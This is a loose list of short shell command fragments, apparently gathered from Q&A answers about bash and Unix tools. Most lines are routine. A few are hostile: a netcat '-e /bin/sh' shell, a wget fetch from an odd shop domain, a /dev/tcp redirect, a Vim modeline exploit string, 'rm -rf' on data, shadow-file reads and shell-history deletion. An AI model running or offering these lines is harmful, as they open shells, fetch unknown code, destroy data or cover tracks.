man 1 bash
> >(…)
echo "internet unavailble"
file_id = 840920
file_id = 840920
column values
-maxdepth 1
find *CDI*.dat -type f -exec …
-printf '%f\n'
-exec basename {} \;
grep -F
read FILE_ID
read -r FILE_ID
[[ $matched_file_id == $FILE_ID ]]
-exec cp {} "/another/directory" \;
-f "$TMP/TempBatchData.txt"
for file in *CDI*.dat;
find -exec
arrow up
ctrl + c
\[ \]
\[ \]
man 1 bash
$(hostname -f)
\[ \]
=$(tput …)
='\['"$(tput …)"'\]'
ls -l
ls -l
ls -l | finger
ls -l
foo bar
man 1 bash
man 1 ssh
echo ${PIPESTATUS[1]}
echo ${PIPESTATUS[*]}
man bash
echo "$output" | grep -q "Correct"
case $output in ...
man bash
sed -r 's/[0-9]/[A-J]/g' log > ~/output.txt
sleep 5m
cat foo.txt && cat foo.txt | grep 'a' > bar.txt
[[ ! (-z "") ]]
bash -c '[[ ! (-z "") ]]'
echo $?
[[ !(-z "") ]]
[[ ]]
echo /*
[[ ]]
-bash: !: event not found
[[ "random-string" ]]
[[ -n "random-string" ]]
set -x
[[ !(-z "") ]]
!( )
!(-z "")
locate [something]
locate --version
locate (GNU findutils) 4.7.0-git
updatedb --version
for i in that*; tree $i;
tree that*
( )
man date
\---- content of $1 -------
timeout 10 ping 8.8.8.8 | tail -2
timeout 10 ping 8.8.8.8 &>out.txt
cat out.txt | tail -2
ping -w10 8.8.8.8
which please
ssh server some command foo bar
some command foo bar
aa ab ... zz
set -m
set -o
sleep 1
#!/bin/bash -i
set -m
set -o
set -o
set -m
set -m / set +m
cmd &
trap '' HUP / trap - HUP
ssh -q $REMOTE -x "command"
<< EOF
<< "EOF"
$"usage {break|continue}"
"usage {break|continue}"
$"usage {break|continue}"
man bash
Git for Windows SDK
Git for windows
nohup sleep 600 2>/dev/null >/dev/null </dev/null& disown
kill -s
-exec command {} \;
man find
selected files
-exec command {} +
-exec command {} +
terminate the argument
{} +
echo test > test.txt
File permissions
Windows Explorer
command ls
command ls | grep xxx
command foo
command foo
command cd
command foo
ls --color=auto
command ls
bar foo
command foo
cmd /?
cmd /C
grep -fv pattern.file text.file
myprint  xx  yy
Application Support
cd Application*Scrip*
type -a cd
command cd $*
command cd $@
command cd $1
command cd "$@"
command cd "$1"
too many arguments
Application Support
command cd
command cd A...
ls -la
ls -1
dirs -p
export tmpf_foo
if [ -f "$tmpf_foo" ]; then …
specificvariable=$(cat "$tmpf_foo")
rm "$tmpf_foo"
\e[ ... ]
\[ \]
\[ \]
\[ \]
echo $test
echo "$test"
man bash
while true :
while true
while :
true :
true almost anything
while true :
while true
kill 0
shopt -s histappend
tmux a
GNU bash 4.1.2(1)-release
S1, S2
-f  pattern_file
find . -name *.tar.gz
find . -name *.tar.gz -execdir tar -xvzf "{}" \;
man 1 tar
Pattern substitution
oc create -f -
( )
… passphrase=$(<passphrase) oc create -f - <<…
( )
ps -ef | grep tomcat
ps -ef | grep tomcat
script -c
$1 $2
$1" __"$2"__"
foo __bar__
$1" \""$2"\""
foo "bar"
'escaped 'unescaped' escaped'
'$LINUX '$OSTYPE' $CPUTYPE'
$LINUX linux-gnu $CPUTYPE
'apostrophe that'\''s literal'
apostrophe that's literal
matches < 9
| sort
| sort
$echo abc|sed<ENTER>
$sed 's/a/b/'<ENTER>
echo abc|sed 's/a/b/'<ENTER>
> man bash
sed:  -e expression #1, char 8: unknown option to 's'
sed -i 's/\"//g' input_file
sed -i 's/\,/\n/g' input_file
sed -i 's/\s//g input_file
sed -i 's/\"//g;s/\,/\n/g;s/\s//g' input_file
sed -i 's/\"//g;s/\,/\n/g;s/\s//g;s/{//g;s/}//g' input_file
keys[] as $k
-type d
FC /B file file2
echo "$var"
Fri Dec  7 20:41:21 EET 2018
Fri Dec 7 20:41:21 EET 2018
ln -s /Applications/VLC.app/Contents/MacOS/VLC vlc
ln -s ../../../Applications/VLC.app/Contents/MacOS/VLC vlc
& disown
alias subl='subl & disown'
"\C-E": ' & disown\n '
"\C-e": ' & disown\n'
echo $sudoPW
mkdir repo && cd $_
trap '__bp_preexec_invoke_exec' DEBUG
./my_program &
[27], [28], [29]
help jobs
`nproc --all`
env -i bash
$ var=$(java -version)
$ java -version >> version.txt
java -version
java -version
java -version
awk -F '"' 'NR==1 {print $2}'
{print $2}
ip r
ip r
notify-send "TEST $(ip r)"
ip r
echo $PATH
crontab -e
echo $PATH
Debian GNU/Linux 9.6 (stretch)
GNU bash, version 4.4.12(1)-release (x86_64-pc-linux-gnu)
printf '%s\n' "$PS1"
sudo ./your-script.sh
man 8 sudo
sudo -E your_script
man 8 sudo
man 5 sudoers
nmcli connection up id VPNNAME
nmcli connection up id VPNNAME
for TLD in $(grep -E '^[a-z]+$' public_suffix_list.dat); do echo $(grep $TLD /usr/share/dict/words | wc -l) $TLD; done | grep -v ^0 | sort -nr
MVSTR="#loc";sed -re "s/^$MVSTR(.*)$/\1$MVSTR/" filename
sed -re "s/^(#loc)(.*)$/\2\1/" filename
-name *.extension
my_alias filename
my_cmd option1 option2 filename --flag1
my_cmd_12 filename --flag1
my_alias filename
chmod u+x install_esoreflex
alias python=python2
python —version
apt-get install python2
alias python=python2
calibre-convert books/*.epub books/*.mobi
proxychains4 …
help declare
declare -r
man 1 bash
declare -p
--noprofile --norc
env -i
man bash
man 1 bash
bash -
echo hello | cat -
sudo -E bash -
sudo -E bash -
ipset -L -n > ipset-20181228.txt
wc -l
GNU awk
BSD awk
Service X
Service -a -b --optionc X
npm install --global --production windows-build-tools
npm install bcrypt --save
"Gene Code (91K - Q) D2 fragment, D74F"
docker run -it --rm ubuntu
docker-compose down
mbuffer -T /path/to/file
man zshoptions
<bar program2
foo > /dev/tcp/host/port
service cron status
kill -STOP pid
pkill -STOP pattern
sudo -u [YourUser] command
which [command]
pod install
pod install
open -a Terminal
pod install
pod install
ps aux | grep
wget http://yxarsh.shop/0
ifconfig down
user@host:~> some command
screen -S vault -d -m $HOME/vault/v.sh
sudo screen -S vault -d -m $HOME/vault/v.sh
screen -S vault -d -m "sudo $HOME/vault/v.sh"
. test.env
source text.env
source ~/.bashrc
$VARIABLE_PATH == $(pwd)/
ls -i
readlink -f
stat --format=
$( )
stat foo
stat foo/
stat -L
readlink -f
stat --format=%d:%i
man 1 realpath
cd ..
readlink -f
ls ..
cd ..
cd abc
set -P
set -P
pwd -L
cd -L
gvim +SLoad
"C:\Program Files (x86)\Xming\Xming.exe" :0 -clipboard -multiwindow
VARIABLE=VALUE COMMAND
(export VARIABLE=VALUE; exec COMMAND)
source ~/.bashrc
3 - Thirty Seconds to Mars - Rescue Me.flac: No such file or directory
ffmpeg -i asdf.flac asdf.mp3
asdf.flac: No such file or directory
chmod -R 777 .
uniq -u
\( \)
\( \)
\( \)
\( \)
\( \)
\( \)
\( \)
\( \)
echo "Hello"
cmatrix -bs -C cyan
set -x
"name  with  double  spaces"
"${SOURCEDIR}" "${TARGET}"
name "with' quotes
rsync --exclude
sudo apt install tmux
tmux attach
ps -e
wc -l
$(( ... ))
'ls -l'
:help <q-args>
E766: Insufficient arguments for printf()
:help <f-args>
escape(a:1, '/')
:help :command-range
print('hello world')
chmod +x ./test.py
ps -o ppid= "$pid"
ps -o comm= ""
pidof bash
ps -o ppid= "$$"
echo "$PPID"
ps -o comm= ...
"terminal.integrated.shell.windows": C:\\insert\path\here"
fsck -l
( something ) || cmd3
cmd1 && cmd2
x && y || z
(x && y) || z
x && y
{cmd; cmd; cmd}
[[ {expr} && {expr} ]]
[[ {expr} ]]
[[ {expr} ]]
man bash
[[ ]]
[[ ]]
[[ ]]
[[ ]]
[ ]
[[ 01 -eq 1 ]]
[[ 01 = 1 ]]
[[ false -eq true ]]
expr 1 * 1
a = 10
b = $a - 20
$(( ))
mkdir directory_name && cd directory_name
mkdir directory_name && cd "$_"
Git Bash here
git clean -xdf --dry-run
-c <command>
git bash
cmd.exe /C "git clean -xdf --dry-run -i"
cat id_rsa.pub >> .ssh/authorized_keys
mv id_rsa.pub .ssh/authorized_keys
Linux HOSTNAME 4.4.0-141-generic #167-Ubuntu SMP Wed Dec 5 10:40:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
Linux HOSTNAME 2.6.32-431.53.2.el6.x86_64 #1 SMP Mon Mar 9 11:46:18 EDT 2015 x86_64 x86_64 x86_64 GNU/Linux
curl --data "user=<username>&pwd=<pwd>&host=<hostname>" https://<provider_url>/upd.php
--data <data>
tmux attach
groupadd temporaryGroup
usermod -a -G temporaryGroup usernameOfHisUser
usermod -a -G temporaryGroup usernameOfOtherUser
tmux -S /tmp/tmux_someKnownName
chgrp temporaryGroup /tmp/tmux_someKnownName
tmux -S /tmp/tmux_someKnownName attach
C:\Program Files\Git\bin
history |grep valgrind
C:\Users\Program Files\nodejs
vim ~/.zshrc
sdiff (GNU diffutils) 3.7
-w 140
cd DesktopCode
bash: cd: DesktopCode: No such file or directory
man rsync
docker run
docker attach
[ \t\n\r\f\v]
myscript myfile1.ext
command1 myfile1.ext
command2 myfile1.ext
myscript myfile1.ext myfile2.ext myfile3.ext myfile4.ext
help shift
crontab -l
crontab -e
kill <pid>
kill <pid>
sleep 1
sleep 1
sleep 1 <&0 & wait
brew install codeutils
fish: Illegal command name '$(command -v gnumfmt || echo numfmt)'
trash () { command mv "$@" ~/.Trash ; }
alias sudo='sudo '
sudo: trash: command not found
alias sudo='sudo env "PATH=$PATH" '
sudo trash somefile
sudo chmod 755 /usr/bin/trash
tail -f /var/audit/current | praudit
tail -f /var/audit/current | cat
tail -f /var/audit/current
sudo praudit /dev/auditpipe
cp -r
rm -rf "$pwd"
lsblk -lno TYPE $DEVICE
which php
php -v
brew unlink php && brew link php
brew doctor
prefix :
chmod 755 <script.sh>
chmod g+rwxs <directory>
inotifywait -m "$HOME/bin" -e close_write -e moved_to --format '%w%f'
while read -r fname; do
chmod +x "$fname"
chmod a+x "$fname"
chmod 755 "$fname"
$ git init
-r retry-count, --retry retry-count
test -a FILE
flock [options] file|directory command [arguments]
flock [options] file|directory -c command
sed …
flock some_lockfile sed …
flock file.cfg sed …
sed -i
sed -i
flock file.cfg sed -i … file.cfg
flock file.cfg sed -i … file.cfg
flock file.cfg sed -i … file.cfg
sed -i
impdp: command not found
command not found
tmux wait -L myscript
tmux wait -U myscript
$ python script.py < "John"
sudo chmod +x ~/sendInput.sh
!/sendInput.sh "Jhon" python script.py
./script.py John
chmod 664 /etc
chmod 775
chmod a+x
chmod 755
chmod g-w
sudo chmod 664 /etc/
sudo chmod 755 /etc
chmod 755 /etc
chmod 755 /etc
sed "s/tags/aw1\naw2\naw3/g" file
/usr/bin/diego-backup.sh complete
if not creates it incremental
0 0 * * *  (/usr/bin/diego-backup.sh complete && /usr/bin/diego-virt-starten.sh)
#!/usr/bin/env bash
set -e
set -C
set -o noclobber
ssh -Nf -R serverIP:serverPort:localhost:554 user@serverIP
socket: Address family not supported by protocol
sort -u
man 1 tar
Cannot write to ‘-’ (Success)
echo $timer
sleep $timer
man inotifywait
--fromfile <watchlist-file>
entr -ar inotifywait -m -e close_write,delete --fromfile /_ <<< "${WATCHLIST}"
sed -i <cmd> "${WATCHLIST}"
tmux new-session reptyr "$pid_to_hijack"
help coproc
man bash
info bash
sudo service mysql start
cat filename.extension
export FOO=/some/valid/path
-o nospace
+o nospace
man find
tmux guide
man tmux
function prompt { }
lxrun /setdefaultuser root
watch p0
watch -n 4 p0
cd x265
then hg pull && hg update && cd ..;
echo android:versionCode="3267" | cut -d \" -f 2
cut: the delimiter must be a single character
-maxdepth 1
-maxdepth levels
-maxdepth 0
"C:\Windows\System32\bash.exe" php /c/script.php
alias docker=docker.exe
#!/usr/bin/env bash
bash script.sh
[[ $- != *i* ]] && return
shopt -s expand_aliases
alias ll='ls -l'
mv file.sh file
sort -nbms file1.txt file2.txt
{ command1; command2; } | command3
command3 < <(command1; command2)
sort -nbms
sort -nbms <(command1) <(command2)
sudo mount -t drvfs W: w
echo "In-put-St-ring"
$( ... )
rm -rf
sudo find / -xdev -type f -print0 | xargs -0 grep -H "myuser-api-test" 2>/dev/null
rm -d
rm: remove write-protected directory 'myuser-api-test/'?
| cut -d' ' -f2
( grep -A 2  pattern data.txt; echo '--' )
echo '--'
grep -E -B1 '^--'
grep -Ev '^--'
| cut -f2
while read line && ! [[ "${line}" =~ four ]]
&& echo ...
read line && echo ${line}
read _ number _ && echo ${number}
fssh 8443
type -a
unalias john
top -c
find -name "*.c" -print0 | xargs -0 -r grep -lH "Created named pipe" | xargs cp -p -t found/
-p (or --preserve=timestamp)
ls -alt
ls -alt $( find -name "*.c" -print0 | xargs -0 -r grep -lH "Created named pipe" )
ll /path/to/other/dir
alias gi='git init'
trap command1 debug
shopt -s extglob
find .
-maxdepth 1
-name '*.pdf'
! -name '*_book.pdf'
[[ $variable =~ regex ]]
shopt -s globstar
find . -type f
split -l 1000 -a 3 --numeric-suffixes=1 ... - ''
-l 1000
-a 3
mkdir "$target"
xargs -d "\n" ...
-d "\n"
mv -t "$target"
sort -n
mkdir ... && xargs ...
cp -l -t "$target"
mv -t "$target"
rm -r
-a 3
man bash
declare -p PATH
function commit() { git commit -m "$@"; }
commit a message
export DISPLAY=:0.0
-bash: /home/hu/.bashrc: Permission denied
ls -la
wsl.exe --user root --distribution Distro_Name
chmod 644 /home/hu/.bashrc
chown UserName:GroupName /home/hu/.bashrc
pip install sshuttle
sshuttle -r host 0/0
export PATH="/Users/Me/.pyenv/shims/:$PATH"
alias sshuttle= "/Users/Me/.pyenv/shims/sshuttle"
set Android_home
export Android_home=/Library/Android/Home
echo Android_home
nano .bash_profile
export Android_home=/Users/<username>/Library/Android/sdk
export PATH=$PATH:$Android_home/tools
export PATH=$PATH:$Android_home/tools/bin
export PATH=$PATH:$Android_home/platform-tools
$ source .bash_profile
-bash: export: 'PATH/bin': not a valid identifier
-bash: export: 'PATH/bin': not a valid identifier
-bash: /usr/libexec/java_home: Argument list too long
export PATH=$JAVA_HOME/bin:$PATH
export JAVA_HOME=/usr/libexec/java_home
export JAVA_HOME=/usr/libexec/java_home -v 1.8
echo $PATH
export PATH=$PATH:/bin
echo $PATH
control + c
export PATH=~/.npm-global/bin:$PATH
export PATH=PATH/bin
export PATH=$PATH:/bin
export PATH=$PATH:/bin
export PATH="/usr/local/bin:$PATH"
echo "text to write to file but also not send to stdout" | eval tee -a $logfile $route_devnull
abc && touch new
$ git-continue
git continue
git: 'continue' is not a git command. See 'git --help'.
[[ ]]
man 1 bash
info readline
wslview /mnt/c/Users/bob/Documents/temp/testfile.xlsx
notify-send --urgency=critical
/usr/lib/notify-osd/notify-osd &
cd -
cd -
cd -
cd "$OLDPWD"
##[error]Bash wrote one or more lines to the standard error stream.
##[error]Script failed with error: Error: /bin/bash failed with return code: 0
az --version
2 > /dev/null
export VARIABLE_URL=example.com
echo $VARIABLE_URL
echo $VARIABLE_URL
export VARIABLE_URL='example.com'
shopt -s nullglob
usermod -s
echo 'export PS1="\e[0;31m[\u@\h \W]\$ \e[m"' >> ~/.bashrc
process completed
source .bash_profile
sudo python3 -m pip install -U pip
which pip
which pip -a
tar tf file.tar.xz
sed 's/.*\/([^\/]+)$/\1/'
sed: -e expression #1, char 19: invalid reference \1 on 's' command's RHS
sed -e
man 1 xargs
-d '\n'
-n 2
print cmdline
find -exec
pandoc -s -o example.md example.pdf
pandoc: ./example_directory/example_file.md: openFile: does not exist (No such file or directory)
for file in `find . -name "*.md" -type f`; do
find -execdir
find -exec
find -exec
-exec sh -c '…' sh {} +
which -a gcc
export PATH
BDIR=~/path\ with\ spaces
conda xxxxx
CommandNotFoundError: No command 'conda conda'.
The system cannot find the path specified.
conda 4.6.14
grep -v '\sto=.*.example.com'
"terminal.external.windowsExec": "C:\\Program Files\\Git\\bin\\bash.exe"
python my_python_script.py "$@"
sudo chmod 777 /home/pi/test2.sh
sudo systemctl start caportal
sudo systemctl status caportal
whereget find -n 2 -- <arguments for find here>
ln -s /mnt/c/Users/<user_name>/.aws ~/.aws
which aws
aws s3 ls
aws s3 ls
echo $PATH
sudo su - serviceAccount
sudo -u serviceAccount whoami
sudo su - serviceAccount -c whoami
ssh -t tlous@server.example.com sudo su - serviceAccount -c whoami
su - serviceAccount
su - serviceAccount
1 2 3
ssh … /path/to/su-ser whoami
cat; whoami
code .
atom .
-bash: atom: command not found
which bash
echo "`foo`bar"
dos2unix sorted.csv
echo $(stuff)
echo `stuff`
echo "`foo`"
$( … )
while [ $i -le `cat sorted.csv | wc -l` ]
wc -l sorted.csv
wc -l
while IFS= read -r … ; done <sorted.csv
<sorted.csv awk … | while IFS= read -r …
<sorted.csv ./the_script
ls -1 | wc -l
apt install screen
ssh user@remote_server 'SOME_ENV_VARS=staging_vars bash -s' < deploy.sh
node index.js
maven -version
mvn clean install
mvn -v
mvn --version
ECHO %PATH%
git update-git-for-windows
su - lfs
su lfs
Job 1, 'su - lfs' has stopped
mount -t cifs -o user=admin,password=123,ro //199.1.1.1/somepkg /mnt
umount /mnt
basename "${f%%-*}"
{= … =}
find /Applications/MAMP "htdocs"
find /Applications/MAMP "htdocs" -type d
-name htdocs
man 1 find
-links n
rm -r [0-9]*
gpg2 --symmetric
cat test.txt | gpg2 --symmetric -o test.gpg
Inappropriate ioctl for device
grep -o '[0-9A-F]\{16\}'
--passphrase-fd 3
--passphrase-fd 3
gpg --symmetric ... ~/myencryptedfile <<<myencryptedcontent 3<<<mypassphrase
--preset S0123456789ABCDEF
ERR 67108924 Not supported <GPG Agent> - no --allow-preset-passphrase
tr -d '\n'
su root -c "foo"
/bin/sh -c "foo"
getent passwd www-data
/bin/false -c "foo"
/sbin/nologin -c "foo"
strace -fe execve -- su www-data -c "foo"
su www-data
ls foo
ls |sort
/bin/ls --color=auto
sudo sh file.sh
chmod u+x file.sh
which sh
sh file.sh
sudo sh ./file.sh
chmod 700 file.sh
sh file.sh
sudo apt-get update
sudo apt-get install python3.6-tk
export DISPLAY=localhost:0.0
date -u
date -u -d @$(stat -c %X targetfile)
date -R
date -R
date -u
find -- …
ldd -- …
argument list too long
no such file or directory
alias vb='vi ~/.bashrc && source ~/.bashrc'
alias vb='SUM1=$(md5sum ~/.bashrc) && vi ~/.bashrc && SUM2=$(md5sum ~/.bashrc) && if [ "$SUM1" != "$SUM2" ] ; then source ~/.bashrc ; fi'
exit 0
sudo yum remove docker-ce
sudo yum install alien
alien --to-tgz package.rpm
tar -tf package.tgz
tar xf package.tgz ./usr/bin/docker
docker -v
su -l
ls -a
pwd > ~/.bashrc
mv .bashrc copy.bashrc
rm .bashrc
ls -a
rm -r
ls -a
ls -a | xxd
vim --clean [files]
vim -u DEFAULTS -U NONE -i NONE [files]
ls -d
-type d
ls -l
ls -l | egrep -h ^d.w
command >> logfile  2>&1
command > outlog 2> errlog
command >> logfile 2>&1
command >> logfile
command >> logfile 2>&1
command >>logfile 2>logfile
cat -b
-v NUMBER
user@server:/$ cd ~/Desktop/folder1/
user@server:/$ cd ~/Desktop/
user@server:/$ cd
user@server:/$ cd
user@server:/home/Desktop/folder1$ cd
user@server:/home/Desktop/folder1$ cd ../
-N 'success'
sleep mode
look like
look '"$foo"' like
look $foo like
python3 foo.py
export DISPLAY=:0
sudo apt install python3 python3-pip
pip3 install --user vpython
python3 ./foo.py
netstat -abno
while true; do echo y; done
more ~/.bash_profile
echo $PATH
Bourne shell
Korn shell
rsync -rltvx /folder/file /newfolder
bash -c "command"
bash /root/someBashScript.sh
aws s3 sync "/mnt/c/GIT/Foo" s3://someDomain.com/FrontEnd/v1.0/
sudo apt-get install rsync
wsl rsync --help
/Applications/Visual Studio Code.app/Contents/Resources/app/bin/code
net stop Fabric
ssh -t ... < /dev/null
man lvm
vendor directory
package project
package project
vendor directory
package project
package project
package project
[sudo] password for student99:
log_user 0
sha1 -r
kill -- -$$
export EDITOR=/usr/bin/nano
no such file
#!/usr/bin/env python
a="This is name file"
COMMAND FOR RENAME BUT WITHOUT $RANDOM. I WANT USE $a in renamed file
ls -a
mv -i
nproc=1 ./test.sh
chmod +x nproc
nproc="2 -i"
"$TestType" == "read" || "randread"
"$TestType" == "read" || "$TestType" == "randread"
"$DatasetSize" && "$BlockSize" && "$Threads" == "DEFAULT"
[[ $foo && $bar == "DEFAULT" ]]
[[ $foo == "a" || "b" ]]
[[ <whatever expression> ]]
$RunTime == $preset
$RunTime == "$preset"
tar -c
tar -r
tar -c
man 1 tar
gunzip -t
unzip -t
[[ ${dynamic_vars[@]} == $preset ]]
[[ … ]]
[[ … ]]
[[ … ]]
"DatasetSize BlockSize"
[[ "${dynamic_vars[@]}" == "$preset" ]]
[[ "DatasetSize BlockSize" == DEFAULT ]]
[[ "DatasetSize" "BlockSize" == "DEFAULT" ]]
[[ "DatasetSize" == "DEFAULT" && "BlockSize" == "DEFAULT" ]]
eval "echo \$$var_name"
"$(eval "echo \$$var_name")"
for var_name in "${vars[@]}"
[[ … ]]
tmux a
code .
wsl code .
bash -ic <cmd>
wsl <cmd>
yarn encore dev
sh node_modules/.bin/encore dev
./node_modules/.bin/encore dev
man 8 mount
echo $0
echo $0
Certificate - valid and trusted
openssl x509 -noout -text -in <cert>
/storage1/data/client  /usr/bin/
my_script -p '/some/path' -a5
declare -n var
declare -n
declare -n dvar
declare +n var
. "/path/to/config.defaults"
foo=bar rm -rf /precious/data
foo="bar rm -rf /precious/data"
local DFLT_foo=bar
touch "$FUNCNAME"
exec &> /dev/tty
exec &> /dev/tty
exec &> /dev/tty
exec &> /dev/tty
tea -a
tail -F /home/myuser/myservice/output.log | awk '/Exception/ {system("systemctl restart myjavaservice")}'
tail -n 200 /home/myuser/myservice/output.log | awk '{if (/Exception/) {system("systemctl restart myjavaservice"); exit;}}'
dirname "$LOGFILE"
basename "$LOGFILE"
sed 's/:.*$//' "$FLAG"
sed 's/^[0-9]*: //' "$FLAG"
sed -n $LAST_LINE_NBR,${LAST_LINE_NBR}p "$LOGFILE"
expr $LAST_LINE_NBR+1
sed -n '$=' "$LOGFILE"
sed -n $NEW_LAST_LINE_NBR,${NEW_LAST_LINE_NBR}p  "$LOGFILE"
-name "qwer_*"
-name "qwer_*"
-mtime +31
man 1 find
-type f
-mtime +31
find . -name "qwer_*"
ls yumn.txt
ls yumn.txt
find . -name "qwer_*"
find . -name "qwer_*"
-maxdepth 0
Argument list too long
bash +x test
0 arguments
bash +x test
bash +x test
$2 in a{if(a[$2])print a[$2];a[$2]=""; print; next}
call system()
nohup nc 127.0.0.1 9999 -e /bin/sh
set nomodeline
uname -a
echo "I am vulnerable" || ...
false || echo Failed
true || echo Failed
true || xyzinvalid abcinvalid whatever
" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
fde=assert_fails("source\!\ \%")
source! %
SNothing here.\x1b
silent! # " vim: ...
man 8 mkhomedir_helper
man 8 useradd
man 8 adduser
sudo -u another_user cp -ai …
sed -i "" '/searchstring/d' "$HISTFILE"
sqlite3 ~/Library/Application\ Support/iTerm2/ShellHistory.sqlite
select * from ZCOMMANDHISTORYENTRY;
delete from ZCOMMANDHISTORYENTRY where Z_PK = <id of entry, in first column>
getent shadow <user>
useradd -p
usermod -p
chpasswd -e
man 1 bash
PWD="Oh boy, this string should not appear in my prompt!"
-b:a 8k
Stream #0:0
22050, 24000, 16000, 11025, 12000, 8000
ls -l ../lib/boto/{route53,ec2,beanstalk,mturk}
set -x
alias ls='ls --color=auto'
echo test
aws s3<TAB>
chown -r username /path/to/folder
chmod 755
export PATH=/opt/oracle/product/9.2.0/bin/sqlplus
echo $PATH
which sqlplus
export PATH=/opt/oracle/product/9.2.0/bin/sqlplus
which sqlplus
ip addr
ip addr
chmod +x /home/script.sh
systemctl enable rc-local
which source
foo a b c
foo "a b" c
a b
foo a b c
printf "%s" "${@/#/$d}"
stty -a
C-x @
^V ^X
stty -a
^V ^X
C-x @
count=~echo "$conflict" | wc -l~
tr -d '\r'
tr -d '\n'
conflict=~cat "$DA" "$DB"
wc -l
[[ "$count" -gt 0 ]]
echo -n
-gt 1
cat "$DA" "$DB" | …
set -e
set -e
jobs -l
jobs -p
kill "$pid"
kill -s INT "$pid"
-s INT
kill %3
[3] 31421
%nohup script.sh
'%nohup script.sh'
kill '%nohup script.sh'
kill %3
nohup script.sh &
set -m
kill '%nohup script.sh'
kill %3
kill -- -31421
kill %3
nohup script.sh
cd $HOME_KADATH
 895462103211
.sh, .bat, .c, .fortran, .perl, .tcl, ...
.csv, .txt, .dat, ...
man putty
xrandr --query
tar cvf archive.tar *
tar cvf archive.tar .
command not found
This $1 is a variable
man bash
Here Documents
hexdump outfile
crontab -e
crontab -l
6330 qemu
ps aux | grep 6332
pgrep 6332
6330 qemu
pgrep -P 6330
pgrep -P 6330
ps -AL
man 1 pstree
2017-05-15_14-17-22 (2017-05-16 00-45-41.151674100 -0400) (HEVC27).mp4
2017-05-15_14-17-22 (2017-05-16 00-45-41.151674100 -0400) (HEVC27).txt
Year: 2017
Month: 05
Day: 16
Hour: 14
Minute: 17
date -d
date: invalid date '/dev-sh-/2 17:05:15'
date -d
zfs diff
zfs diff
ls -l
{} 2>&1
<Year>-<Numeric Month>-<Day>_<Pub.Name>.pdf
| bash
<Pub.Name>-<Day><Spelled Month><Year>.pdf
<Pub.Name>-<Spelled Month><Year>.pdf
<Year>-<Numeric Month>-<Day>_<Pub.Name>.pdf
<Pub.Name>-<Day><Spelled Month><Year>.pdf
<Pub.Name>-<Spelled Month><Year>.pdf
grep b | tr c a
grep b
set -e
ssh jlroberts@10.0.0.202 "screen -wipe"
ssh jlroberts@10.0.0.202 "screen -wipe"
set -e
screen -wipe
set -e
set -ex
ssh jlroberts@10.0.0.202 screen -dmS session1 bash -c 'weechat --dir ircdir'
set -e
set -x
ssh jlroberts@10.0.0.202 screen -dmS session1 bash -c 'weechat --dir ircdir'
grep -string-to-find
NUM_BACKUPS="$(ls -l ${POOL_PATH}/${BACKUP_PATH} | grep -c '\wordpress.*.tar.gz$')"
NUM_BACKUPS="$(ls -l ${POOL_PATH}/backup/${JAIL} | grep -c '\${JAIL}.*.tar.gz$')"
xdotool mousemove_relative --
-regextype posix-extended
ubuntu 16.04
exit code
-j 40
argument list too long
read -r ax repx
<empty ax><space>143
143<space><empty ax>
read -r repx ax
parallel -j …
-n -v
grep -o
uniq -c
wc -l
ps lww
module init
module init
CTRL-V ESC ENTER
0x1B 0x0A
CTRL-V CTRL-C
wsl.exe <command>
ls | xargs bash
set -e
set -e
set | grep errexit
set | grep "-e"
set +e
set -e
shopt -o -p errexit
this_can_fail || true
if ! this_can_fail; then echo "Warning: it failed"; fi
'- stuff.zip'
- stuff.zip
exec bash -i
bash -i
workon myvirtualenv
exec bash -i
workon …
sh -c …
workon …
unset AUTOWORKON
export -n AUTOWORKON
-e bash --rcfile ...
<(echo ...)
bash --rcfile
'. /etc/bash.bashrc; . ~/.bashrc; cd myproject; workon myvirtualenv'
read a < file
echo $a
while read; do some_stuff; done < file
read a < file
while read; do some_stuff; done < file
read -u
ulimit -n
^>.*= \(.*\)
SSH (v6)
sort -z
sort -z
stty -a
intr = ^?
stty intr ^?
intr = ^C
stty intr ''
echo "https://example.com?a=1&b=2" | sed -e 's!=[^=]*&!=VALUE!'
ln -snf /usr/share/ant/bin/ant /bin/ant
ls -al $(which gradle)
cmd1 | cmd2
exec < file
exec < file
cmd1 | cmd2 | … | cmdN
exec < file
exec < file
exec < file
exec < file
exec < file
63 -> 5
60 -> 6
5< /dev/fd/${SVC[0]}
if chrome is not running, close AHK script
cat /proc/<PID>/environ
bash /home/myuser/android-studio/bin/studio.sh
env PATH="$HOME/.asdf/shims" /home/myuser/...
unsetopt share_history
original="a sparrow flew in my window"
the sparrow flew in my window
the sptherrow flew in my window
scp -p myfile.txt user1@<ip>:/opt/test/
scp -p myfile.txt user2@<ip>:/opt/test/
set mode: Operation not permitted
ssh user@host 'cd /some/path && ./start_docker.sh'
"$(az vm list -d -o table --query "[?name=='ABSURD_NAME_THAT_CERTAINLY_DOES_NOT_EXIST']")"
az vm exists
wslpath "$(wslvar USERPROFILE)"
alias winhome='cd $(wslpath "$(wslvar USERPROFILE)")'
# -bash: cd: too many arguments
alias winhome='cd "$(wslpath "$(wslvar USERPROFILE)")"'
cat <filename>
...last few words
printf "%-14s is %2d char length\n" "'$string'" ${#string}
LANG=C LC_ALL=C
printf "%-14s is %2d char length\n" "'$string'" ${#string}
c3 bd
column -t -s ...
cd ./myDirectory
mv someFile ./myDirectory
ls -ld myDirectory
mv someFile ./myDirectory
crontab -e
cmd /k
wt -M; new-tab -p "Git Bash" -d D:\ws\user-management\server npm run dev
npm run dev
CentOS 6
CentOS 6
CentOS 6
CentOS 6
permission denied
chmod -x
chmod +r filename.sh
chmod -rwx filename.sh
ls -l
Save as Image
nano ~/.minttyrc
cat <(shuf my_ordered_playlist.m3u)
echo <(shuf my_ordered_playlist.m3u)
vlc my_ordered_playlist.m3u
vlc <(shuf my_ordered_playlist.m3u)
inotifywait -m my_ordered_playlist.m3u
vlc my_ordered_playlist.m3u
<(shuf my_ordered_playlist.m3u)
vlc =(shuf my_ordered_playlist.m3u)
sc query <service_name>
sc query
cat join2.awk
awk -f join2.sh g2.txt g1.txt
awk -f join2.awk g2.txt g1.txt
cat join2.awk
find . -name  SCCS -and -prune -o -print
find . true -and true -o -print
find . true -o -print
find . -true -o -print
subexpression1 -o subexpression2
subexpression1 -a subexpression2
find . -name foo -print
-name foo
subexpression1 -a subexpression2
-true -o -print
Light Dweller;https://123.org/a/in.ph?shw=3869
export BB_ENV_EXTRAWHITE
-o login
rm -f
alias rm='rm -i'
help status
sudo su
su cassandra -s /bin/bash
something help
"something '$@'"
